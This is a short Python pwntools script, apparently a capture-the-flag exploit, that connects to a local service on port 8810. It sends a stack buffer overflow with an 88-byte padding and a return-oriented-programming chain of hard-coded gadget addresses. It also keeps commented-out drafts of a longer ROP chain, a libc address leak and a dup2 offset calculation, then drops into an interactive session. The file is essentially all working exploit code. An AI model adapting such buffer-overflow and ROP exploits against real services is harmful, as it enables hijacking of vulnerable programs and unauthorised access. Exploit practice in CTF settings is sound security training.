from pwn import *
io=remote("localhost",8810)

bss=0x601180
pop_rdi=0x00000000004008e3
htons=0x0000000000400610
ret=0x000000000040082f


write=0x00000000004005f0


init=0x00000000004008da
#io.sendline("a"*80+p64(bss)+p64(pop_rdi)+p64(1024)+p64(htons)+p64(ret))
io.sendline("a"*88+p64(0x00000000004008e3)+p64(0x0000000000600ff0)+p64(0x0000000000400854))
startmain=0x0000000000600ff0

inti2=0x00000000004008c0

read=0x0000000000400630

#io.sendline(p64(write)+"b"*83+p64(0xdeadbeef)*2+p64(write)+p64(read)+p64(init)+p64(0)+p64(1)+p64(0x601178)+p64(4)+p64(startmain)+p64(8)+p64(inti2)+p64(1)+p64(0)+p64(1)+p64(0x601180)+p64(4)+p64(bss)+p64(0x90))

#leak=u64(io.recv(6)+"\x00\x00")
#dup2=leak+0xe6c90
#print hex(leak)
io.interactive()
